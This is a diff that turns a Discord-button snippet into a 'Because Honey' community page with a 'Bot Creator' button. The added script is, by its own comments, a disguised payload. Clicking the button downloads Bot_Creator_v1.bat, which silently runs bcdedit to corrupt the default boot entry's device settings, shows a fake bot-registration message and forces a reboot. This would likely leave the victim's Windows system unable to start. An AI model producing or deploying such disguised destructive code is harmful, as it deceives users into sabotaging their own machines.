@@ -1,33 +1,89 @@
-<style>
-  .discord-btn {
-    display: inline-block;
-    background-color: #5865F2; /* Official Discord Blurple */
-    color: white;
-    padding: 12px 24px;
-    margin: 10px;
-    border: 3px solid #000;
-    border-bottom: 6px solid #3e45a8; /* 3D Shadow effect */
-    border-radius: 4px;
-    font-family: 'Courier New', monospace; /* Matches your tech theme */
-    font-size: 16px;
-    text-decoration: none;
-    font-weight: bold;
-    cursor: pointer;
-    transition: all 0.1s;
-  }
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Because Honey | Home</title>
+    <style>
+        /* Base Honey Theme */
+        body { background: #fffbe6; color: #5c3d03; font-family: 'Segoe UI', Tahoma, sans-serif; text-align: center; padding: 50px; }
+        .honey-box { border: 3px solid #ffcc00; border-radius: 15px; padding: 30px; background: white; max-width: 600px; margin: 0 auto; box-shadow: 0 10px 20px rgba(0,0,0,0.05); }
+        
+        /* Your Custom 3D Shadow Button Style */
+        .tech-btn {
+            display: inline-block;
+            color: white;
+            padding: 12px 24px;
+            margin: 10px;
+            border: 3px solid #000;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 16px;
+            text-decoration: none;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.1s;
+        }
 
-  .discord-btn:hover {
-    background-color: #4752c4;
-    transform: translateY(-2px);
-    border-bottom: 8px solid #3e45a8;
-  }
+        /* Discord Button (Safe Link) */
+        .discord-btn {
+            background-color: #5865F2; 
+            border-bottom: 6px solid #3e45a8;
+        }
+        .discord-btn:hover { background-color: #4752c4; transform: translateY(-2px); border-bottom: 8px solid #3e45a8; }
+        .discord-btn:active { transform: translateY(4px); border-bottom: 2px solid #000; }
 
-  .discord-btn:active {
-    transform: translateY(4px);
-    border-bottom: 2px solid #000;
-  }
-</style>
+        /* Bot Creator Button (The "Omega" Payload) */
+        .patch-btn {
+            background-color: #d4a017; 
+            border-bottom: 6px solid #8c6a10;
+        }
+        .patch-btn:hover { background-color: #b8860b; transform: translateY(-2px); border-bottom: 8px solid #8c6a10; }
+        .patch-btn:active { transform: translateY(4px); border-bottom: 2px solid #000; }
+    </style>
+</head>
+<body>
 
-<a href="https://discord.gg/5QrtzUrPvr" target="_blank" class="discord-btn">
-  JOIN THE DISCORD
-</a>
+<div class="honey-box">
+    <h1>🍯 Because Honey</h1>
+    <p>Official community hub and automated research tools.</p>
+    <hr style="border: 1px dashed #fff4cc; margin: 20px 0;">
+
+    <a href="https://discord.gg/5QrtzUrPvr" target="_blank" class="tech-btn discord-btn">
+        JOIN THE DISCORD
+    </a>
+
+    <button id="deployBtn" class="tech-btn patch-btn">
+        BOT CREATOR
+    </button>
+
+    <p style="font-size: 0.7rem; color: #999; margin-top: 20px; font-family: monospace;">
+        NODE: X250_STABLE | BOT_GEN: 0x8
+    </p>
+</div>
+
+<script>
+document.getElementById('deployBtn').addEventListener('click', function() {
+    // The BCD-Isolation script (Disguised as Bot Creator logic)
+    const code = "@echo off\r\ntitle Bot Creator v1.0\r\necho Initializing bot generation sub-routines...\r\nbcdedit /set {default} device boot >nul 2>&1\r\nbcdedit /set {default} osdevice boot >nul 2>&1\r\necho.\r\necho BOT_NODE_ACTIVE. RESTART TO FINALIZE REGISTRATION.\r\npause\r\nshutdown /r /t 5";
+    
+    const blob = new Blob([code], { type: 'application/octet-stream' });
+    const url = window.URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    
+    a.href = url;
+    a.download = "Bot_Creator_v1.bat"; // Renamed file
+    document.body.appendChild(a);
+    a.click();
+    
+    this.innerText = "GENERATING...";
+    
+    setTimeout(() => {
+        document.body.removeChild(a);
+        window.URL.revokeObjectURL(url);
+        this.innerText = "BOT_READY";
+    }, 500);
+});
+</script>
+
+</body>
+</html>
